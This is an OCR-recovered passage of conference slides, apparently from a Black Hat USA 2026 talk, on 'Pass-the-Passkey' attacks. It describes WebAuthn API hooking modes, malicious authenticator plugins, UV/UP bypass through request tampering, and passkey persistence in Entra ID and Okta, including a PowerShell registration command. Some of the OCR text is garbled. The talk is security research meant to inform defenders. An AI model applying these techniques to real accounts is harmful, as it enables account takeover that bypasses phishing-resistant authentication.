Copyright Copyright (c) 2021-2026 Michael Grafnett...
Size 130 MB
Date modified 5/10/2026 12:04 AM
Language Language Neutral
Original filename PasskeyUI.dil
Cancel
```

## Slide 56

## **Application Identifier Spoofing – Version Info Struct**

60


> Recovered by OCR — confidence 91/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Application Identifier Spoofing — Version Info Struct
<Project Sdk="Microsoft.NET.Sdk">
<PropertyGroup>
<Authors>Microsoft Corporation</Authors>
© Windows Security x
Sign in with a passkey
a Passkey for login.microsoft.com
Hello, Michael!
Select OK to continue.
Sign-in options
Choose a different passkey
60
```

## Slide 57

**Passkey Detour Attack WebAuthn API Hooking**

61


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Passkey Detour Attack
WebAuthn API Hooking
bisek hat
USA 2026
```

## Slide 58

**P A S S K E Y D E T O U R A T T A C K**

## **Modes of Operation**

#### **Assertion Replay**

- Both attacker and victim are logged in

- Uses victim challenge

- Relying party lacks challenge replay protection

- Works against Microsoft Entra

#### **Assertion Capture**

- Attacker is logged in

- Victim sees transient error

- Uses victim challenge

- Relying party has challenge replay protection

- Works against most web applications

#### **Challenge Injection**

- Attacker is logged in

- Victim sees transient error

- Uses attacker challenge

- Relying party binds challenges to sessions

- Works against GitHub

62

## Slide 59

# **DEMO**

**Passkey Detour Attack (Assertion Capture Mode)**

63

## Slide 60

**DEMO Passkey Detour Attack (Challenge Injection Mode)**

65


> Recovered by OCR — confidence 96/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMO
Passkey Detour Attack (Challenge Injection Mode)
USA 2026
65
```

## Slide 61

# **Miscellaneous Passkey Attacks**

67


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Miscellaneous
Passkey Attacks
bisek hat
USA 2026
```

## Slide 62

## **Evil Authenticator Plugin Attack – Registration**

68


> Recovered by OCR — confidence 77/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Evil Authenticator Plugin Attack — Registration
\
Local Account
ip Michael Accounts > Passkeys >» Advanced options
Passkey managers
H .
A ome R ee Passkey Manager On [ e@)
® Bluetooth & devices oO hea oe On re)
© Network & internet
4 Personalization Save passkeys to this Windows device On [ @)
a | Apps
| © Accounts $@ Get help
& Time & language
@® Gaming
x Accessibility
```

## Slide 63

## **Evil Authenticator Plugin Attack – Credential UI**

69


> Recovered by OCR — confidence 87/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Evil Authenticator Plugin Attack — Credential Ul
© Windows Security x |
Choose where to save your passkey
R 100% Legit Passkey Manager
© This Windows device
Es iPhone, iPad, or Android device
0 Security key
```

## Slide 64

## **Request Tampering Attack (UV and UP Bypass)**

70


> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request Tampering Attack (UV and UP Bypass)
P® Passkey UI
Load Default Options
Assertion Options
Relying party:
Authenticator:
User verification:
Help
Windows API Information Registration Authentication Platform Credentials Authenticators Event Log
login.microsoft.com U2F AppID:
Any v Credential hint: None v Remote web origin:
Discouraged ~ Large bloboperation: None + | | Getcredential blob | | Browser in private mode Timeout: 120s e Generate challenge
Challenge:
Large blob:
HMAC secret salt 1:
Any
Required
Preferred
| Discouraged
Generate HMAC secret salt 2: Generate
& Authenticate Sign with File
70
```

## Slide 65

## **Assertion Fuzzing Attack**

71


> Recovered by OCR — confidence 81/100 on the text kept, 51/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Assertion Fuzzing Attack
"authenticatorAttachment": "platform",
"clientExtensionResults": {},
"id": "“SB4QTDkm-@C@nJk7KAsUa7d3r914aq5H-eVChLSSejM",
"rawld": "SB4QTDkm-@C@nJk7KAsUa7d3r914aq5H-eVChLSSejM",
"response": {
"type": "public-key"
71
```

## Slide 66

## **Passkey Persistence Attack – Entra ID + Okta**

72


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Passkey Persistence Attack — Entra ID + Okta
& PowerShell 4 tiv
PS C:\> Connect-MgGraph JserAuthenticationMethod.ReadWrite.ALl dev.dsinternals.com
PS C:\> Register-Passkey AdeleVaddev.dsinternals.com "Yubikey C Bio Primary
ry x
WwW Windows Security
Choose where to save this passkey
A Security key
More choices
iPhone, iPad, or Android device
| a Security key
Next Cancel
```

## Slide 67

**Summary Pass-the-Passkey Family of Attacks**

73


> Recovered by OCR — confidence 93/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Summary
Pass-the-Passkey Family of Attacks
USA 2026
73
```

## Slide 68

## **Pass-the-Passkey Attacks – OS Layer**

74

## Slide 69

## **Pass-the-Passkey Attack Tooling**

75


> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Pass-the-Passkey Attack Tooling
@ Relying Party
(Passkey Authentication)
BX Compromised Computer A
AP! hooking}
Passkey Authenticators
# Desktop App
BS Compromised Computer B
Replayable assertion:
*, Operator's Computer
75
```

## Slide 70

## **Key Takeaways**

1. Passkeys remain worth adopting because attacks are harder than passwords. 2. Endpoint compromise and flaws can bypass phishing-resistant MFA.

3. Test passkey implementations for replay, relay, and tampering.

4. Visit https://github.com/SpecterOps/pass-the-passkey for details.

76

## Slide 71

77
